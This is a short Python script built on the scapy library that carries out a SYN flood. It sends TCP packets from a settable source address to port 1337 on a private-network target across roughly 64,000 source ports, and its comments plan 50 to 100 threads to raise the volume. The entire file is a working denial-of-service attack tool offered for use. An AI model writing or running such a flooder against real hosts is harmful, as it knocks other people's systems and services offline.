from scapy.all import *

#single port
#while or for loop
#multithreading x 50 - 100

def synFlood(src, tgt):
    for sport in range(1024, 65535):
        L3 = IP(src=src, dst = tgt)
        L4 = TCP(sport = sport, dport = 1337)
        #stop ACK. add restriction
        pkt = L3/L4
        send(pkt)

src = "127.0.0.1"
tgt = "192.168.55.78"


synFlood(src, tgt)
